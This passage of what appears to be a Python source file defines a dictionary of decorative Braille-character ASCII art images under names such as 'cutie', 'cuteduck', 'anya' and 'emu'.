⠀⠀⠀⠀⠀⠈⠓⠶⣶⣦⠤⠀⠘⠋⠘⠋⠀⠠⣴⣶⡶⠞⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣿⢹⣷⠦⢀⠤⡤⡆⡤⣶⣿⢸⠇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢰⡀⠘⢯⣳⢶⠦⣧⢷⢗⣫⠇⠀⡸⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠑⢤⡀⠈⠋⠛⠛⠋⠉⢀⡠⠒⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢦⠀⢀⣀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

),
  
  "cutie": ("""
            
                                                 ⢀⠴⣂⣀⠒⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠔⠢⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                ⣾⢺⣿⣿⣷⣌⡒⠢⠤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠤⠴⠋⣴⣿⣷⡆⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                ⠘⢌⢻⣿⣿⣿⣿⣿⣷⣦⣬⣙⠢⡄⠀⢀⣀⣀⣀⣀⣀⡀⠀⢀⡤⢒⣉⣥⣴⣾⣾⣿⣿⣿⡿⢃⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                ⠀⢸⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣨⣥⣤⣤⣤⣶⣤⣤⣤⣬⣉⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                ⠀⡟⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                ⠀⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                ⠀⢧⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                ⠀⠈⠒⠎⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣁⣴⡄⠀⠀⣤⣄⢹⣿⣿⣿⣿⣿⣿⣿⣿⡟⢉⠔⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                ⠀⠀⣸⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣟⠁⢀⡀⢙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                ⠀⠀⡇⣼⣿⣿⣿⣿⣿⣿⣿⡿⠛⠉⠁⠈⠙⠛⠷⣾⣷⣾⠿⠛⠉⠈⠙⠻⣿⣿⣿⣿⣿⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                ⠀⠀⡇⢿⣿⣿⣿⣿⣿⡟⠁⢸⣷⣀⠀⠀⠀⠀         ⠀⣀⣴⡌⢿⣿⣿⣿⠄⣇⠤⢒⡂⠩⠍⠍⠉⢁⣐⠢⢄⡀⣀⠤⢒⣂⣒⢦⡀
                                                ⠀⠀⢳⢸⣿⣿⣿⣿⡿⠀⠀⢈⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⢰⣾⣿⣿⠁⠈⣿⣿⡟⠒⠦⠊⠁⠀⠀⠀⠀⠀⠀⠀⠉⠲⢍⠥⠒⢁⠤⡈⡆⡇
                                                ⠀⠀⠈⣆⢿⣿⣿⣿⣇⠀⠀⠘⢿⣿⡿⠁⠀⠀⠀⣀⣀⠀⠀⠀⠸⣿⣿⡿⠀⠀⣿⡿⠁⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⠥⢔⡵⢣⠇
                                                ⠀⠀⠀⠈⢦⡙⢿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⣌⠓⢊⡤⠀⠀⠀⠀⠀⠀⠀⣼⠛⠀⡜⡠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡉⡥⠒⠁⠀
                                                ⠀⠀⠀⠀⠀⠙⣦⢈⡛⠻⣷⣤⣀⠀⠀⠀⢠⡴⠿⢿⡿⠶⣤⡀⢀⣀⠤⠒⠉⠀⢠⡜⠁⠣⣀⣹⠆⢀⣤⡀⠀⠠⡒⠉⣸⠀⠀⠀⠀⡇⣧⠀⠀⠀
                                                ⠀⠀⣰⢉⣌⠓⠁⣇⣸⠿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣿⠀⠀⣿⣿⣶⣤⠒⢦⠀⢄⣇⠀⠀⠀⠀⠀⠈⣲⠃⠀⠀⠈⠉⠀⠀⠀⠀⠀⡇⢸⠀⠀⠀
                                                ⠀⠀⡏⣸⣿⣷⣤⠀⠐⠀⡴⠲⣿⣿⠿⠟⠃⠀⢠⡾⢿⡄⠀⠈⢻⠛⠉⠒⠉⠀⠀⢨⣢⠀⠀⠀⠀⠠⠌⠄⣀⣀⢀⡄⠀⠀⠀⠀⠀⢧⢸⠀⠀⠀
                                                ⠀⠀⡇⠿⢿⣿⣍⡄⠀⠀⡗⠊⠀⠻⢦⣄⣤⠶⠟⠀⠈⠷⣤⣀⠼⠀⠀⠀⠀⠄⡞⢩⠋⠀⠀⠀⠀⠀⠀⠀⠀⢨⠏⠀⠀⢀⡖⡠⠐⠚⠈⡄⠀⠀
                                                ⠀⠀⠈⠑⢦⡛⢿⣷⣶⣾⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠏⠀⠀⠀⠀⠀⢀⡽⠿⢄⡀⠀⠀⠀⠀⠀⠀⠀⠡⣂⡀⡤⣊⠴⠁⠀⠀⡆⢇⣀⡀
                                                ⠀⠀⠀⠀⠀⠉⠒⠀⠀⠄⢌⣧⠀⠀⠀⠀⠀⠀⢠⡄⠀⠀⢹⠀⠀⠀⠀⠀⡰⠙⢦⠀⠀⠈⠙⢲⡆⠂⠀⠀⠀⠀⠀⠁⠤⠠⠀⠠⢄⠊⣧⠤⢢⢹
                                                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡎⠞⠀⠀⠀⠀⠀⠀⠛⢳⡄⠀⠈⢳⠀⠀⣀⠀⢣⠀⣸⠀⠀⠀⠀⡏⠁⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⣠⠏⢀⠯⠔⣃⠏
                                                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⢠⡀⠀⠀⠀⠀⠀⠀⢸⡇⠀⣀⠞⡴⠁⠀⠉⢎⡓⠥⠅⠤⠤⠅⡧⠀⣠⡇⠀⠀⠀⠀⠀⠀⠐⠊⣡⣶⣿⠗⠈⠁⠀
                                                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⠍⣐⣒⣒⣒⣒⣂⠩⠭⠭⠗⠊⠀⠀⠀⠀⠀⠈⠁⠀⠀⠁⠒⢌⡛⠮⠄⠐⢂⣀⣐⠂⣒⣂⠿⠟⠋⠀⠀⠀⠀⠀
                                                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠁⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""      
  ),
  
  "cutekawaii": ("""
                 
                 ⠀⠀⠀⣀⣀⣤⣤⣤⣀⡀⢀⣠⣴⣶⣶⣽⣭⣷⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⠟⠛⠉⠉⠙⠛⠿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠉⠻⢿⣦⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⠋⣤⣶⣦⣦⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣈⣉⠉⠉⠙⠛⢿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣶⡿⠿⠁⢠⡿⠀⠀⠀⠀⠀⠈⠉⠛⣷⣶⣤⣤⣤⡶⠾⠟⠛⠋⠉⠙⠛⠻⣷⠀⠀⠀⠈⢻⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⢸⡟⠀⢸⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⢻⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣾⡟⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢀⣼⠿⠻⠿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡟⠀⠀⠀⠀⠀⠘⣿⣧⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠐⣿⡇⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⣀⣤⣶⠾⠛⠁⠀⠀⠀⠙⢷⣄⡀⠀⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⠀⠀⠀⠀⠙⠻⣷⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣶⣤⣀⡀⢀⣼⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡆⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⢃⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀
⠀⠀⠀⠀⣸⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀
⠀⠀⢀⣾⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣧⡀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠺⣶⣄⡀⢸⣿⠀⠀⠀⠀
⠀⢠⣿⠏⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢠⣶⣤⣤⣶⠾⠋⠉⠛⠻⠶⠶⠶⠾⢿⣯⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣾⣿⠀⠀⠀⠀
⢠⣿⠋⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⣠⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠷⣿⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣷⡄⠀⠀
⣿⡏⠀⠀⠀⠀⠀⠀⣸⡇⠀⠷⣶⠟⠋⠁⠀⠀⢀⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣧⠀⠀⠀⠀⠀⠀⠀⠀⣤⡀⠀⠀⠀⠀⠀⠀⠻⣿⣆⠀
⣿⣇⠀⠀⠀⠀⢀⣴⠟⠀⠀⠀⣿⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣶⡄⢀⡀⠙⢷⣦⡄⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⢹⣿⡄
⠘⠿⣷⣦⣴⣶⣿⣿⣄⠀⠀⠀⢿⣆⠀⠀⠀⠀⠛⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⡇⠀⠈⠳⠀⣿⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠈⣿⡇
⠀⠀⠀⠈⠁⠀⠀⠙⠿⢷⣶⣶⡈⠻⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀⠀⢻⣷⣄⡀⠀⠀⠀⣀⣼⣿⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣦⣤⣭⣿⣷⣶⣤⣤⣤⣀⣀⣀⣀⣀⣀⣀⣀⣀⣨⣠⣤⣤⣴⠶⡟⢷⠀⠀⠀⠀⢀⣴⣿⠟⠻⠿⠿⠿⠿⠿⠛⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠛⠛⠛⠛⠛⠋⠉⠛⠿⢷⣶⣶⠿⢿⣶⣦⣤⣶⣾⠿⠋⠁

"""
    ),
  "cuteduck": ("""
               
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                ⣀⣴⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⠟⠋⢹⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⠿⠟⠛⠉⠁⢠⣤⣤⣿⡿⠛⠿⢿⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⠟⠋⠀⠀⠀⠀⠀⠀⠈⠉⠛⠉⠀⠀⠀⠀⠀⠉⠻⢿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠿⣶⡀⠀⠀⠀⣠⣤⣤⠀⠹⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣿⠏⠀⠀⠀⠀⠀⠀⢠⣶⣶⣦⠀⠀⠀⠀⢰⣿⠁⠀⢀⣿⡇⠀⠀⠀⢿⣿⣿⠇⠀⢻⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣾⡟⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⠟⠀⠀⠀⠀⠘⣿⡿⠿⢿⣿⠀⠀⠀⠀⠀⠉⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣤⣷⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣶⣾⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣶⣶⣄⠀⠀
⠀⢰⣿⠋⠁⠀⠀⠉⠛⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⠀⠈⢻⣷⠀
⢀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⡀⠀⢀⣿⡇
⢸⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣷⢀⣾⡟⠀
⠀⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⡿⠋⠀⠀
⠀⣿⡇⠉⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡅⠀⠀⠀
⠀⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀⠀⠀
⠀⠘⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠀⠀⠀⠀
⠀⠀⠹⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠃⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣷⣦⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣴⣶⠿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠉⠉⠀⠀⠉⠙⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠁⠀⠀⠀
"""
            
            

),
  
  
  
  "anya": ("""
          
          ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢲⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠄⠂⢉⠤⠐⠋⠈⠡⡈⠉⠐⠠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡀⢠⣤⠔⠁⢀⠀⠀⠀⠀⠀⠀⠀⠈⢢⠀⠀⠈⠱⡤⣤⠄⣀⠀⠀⠀⠀⠀
⠀⠀⠰⠁⠀⣰⣿⠃⠀⢠⠃⢸⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠈⢞⣦⡀⠈⡇⠀⠀⠀
⠀⠀⠀⢇⣠⡿⠁⠀⢀⡃⠀⣈⠀⠀⠀⠀⢰⡀⠀⠀⠀⠀⢢⠰⠀⠀⢺⣧⢰⠀⠀⠀⠀
⠀⠀⠀⠈⣿⠁⡘⠀⡌⡇⠀⡿⠸⠀⠀⠀⠈⡕⡄⠀⠐⡀⠈⠀⢃⠀⠀⠾⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠇⡇⠃⢠⠀⠶⡀⡇⢃⠡⡀⠀⠀⠡⠈⢂⡀⢁⠀⡁⠸⠀⡆⠘⡀⠀⠀⠀⠀
⠀⠀⠀⠸⠀⢸⠀⠘⡜⠀⣑⢴⣀⠑⠯⡂⠄⣀⣣⢀⣈⢺⡜⢣⠀⡆⡇⠀⢣⠀⠀⠀⠀
⠀⠀⠀⠇⠀⢸⠀⡗⣰⡿⡻⠿⡳⡅⠀⠀⠀⠀⠈⡵⠿⠿⡻⣷⡡⡇⡇⠀⢸⣇⠀⠀⠀
⠀⠀⢰⠀⠀⡆⡄⣧⡏⠸⢠⢲⢸⠁⠀⠀⠀⠀⠐⢙⢰⠂⢡⠘⣇⡇⠃⠀⠀⢹⡄⠀⠀
⠀⠀⠟⠀⠀⢰⢁⡇⠇⠰⣀⢁⡜⠀⠀⠀⠀⠀⠀⠘⣀⣁⠌⠀⠃⠰⠀⠀⠀⠈⠰⠀⠀
⠀⡘⠀⠀⠀⠀⢊⣤⠀⠀⠤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠄⠀⢸⠃⠀⠀⠀⠀⠀⠃⠀
⢠⠁⢀⠀⠀⠀⠈⢿⡀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⢀⠏⠀⠀⠀⠀⠀⠀⠸⠀
⠘⠸⠘⡀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠁⠀⠃⠀⠀⠀⠀⢀⠎⠀⠀⠀⠀⠀⢠⠀⠀⡇
⠀⠇⢆⢃⠀⠀⠀⠀⠀⡏⢲⢤⢀⡀⠀⠀⠀⠀⠀⢀⣠⠄⡚⠀⠀⠀⠀⠀⠀⣾⠀⠀⠀
⢰⠈⢌⢎⢆⠀⠀⠀⠀⠁⣌⠆⡰⡁⠉⠉⠀⠉⠁⡱⡘⡼⠇⠀⠀⠀⠀⢀⢬⠃⢠⠀⡆
⠀⢢⠀⠑⢵⣧⡀⠀⠀⡿⠳⠂⠉⠀⠀⠀⠀⠀⠀⠀⠁⢺⡀⠀⠀⢀⢠⣮⠃⢀⠆⡰⠀
⠀⠀⠑⠄⣀⠙⡭⠢⢀⡀⠀⠁⠄⣀⣀⠀⢀⣀⣀⣀⡠⠂⢃⡀⠔⠱⡞⢁⠄⣁⠔⠁⠀
⠀⠀⠀⠀⠀⢠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀
          
          
          
          
"""          
          
),
 "emu":("""
        
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠳⠶⣤⡄⠀⠀⠀⠀⠀⢀⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⣸⠃⠀⠀⠀⠀⣴⠟⠁⠈⢻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⢠⡟⠀⠀⠀⢠⡾⠃⠀⠀⣰⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠓⠾⠁⠀⠀⣰⠟⠀⠀⢀⡾⠋⠀⠀⠀⢀⣴⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣠⣤⣤⣤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣦⣴⠟⠁⠀⠀⣠⡴⠋⠀⠈⢷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣷⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣶⣿⣿⡿⠟⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠻⢿⣿⣿⣶⣄⡀⠀⠀⠀⠺⣏⠀⠀⣀⡴⠟⠁⢀⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⠿⠋⠁⠀⢀⣴⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢶⣬⡙⠿⣿⣿⣶⣄⠀⠀⠙⢷⡾⠋⢀⣤⠾⠋⠙⢷⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡿⠋⠁⠀⠀⠀⢠⣾⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣦⣠⣤⠽⣿⣦⠈⠙⢿⣿⣷⣄⠀⠀⠀⠺⣏⠁⠀⠀⣀⣼⠿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⡿⠋⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⢠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⣿⣧⠀⠀⠈⢿⣷⣄⠀⠙⢿⣿⣷⣄⠀⠀⠙⣧⡴⠟⠋⠀⠀⠀⠀⠀⠀
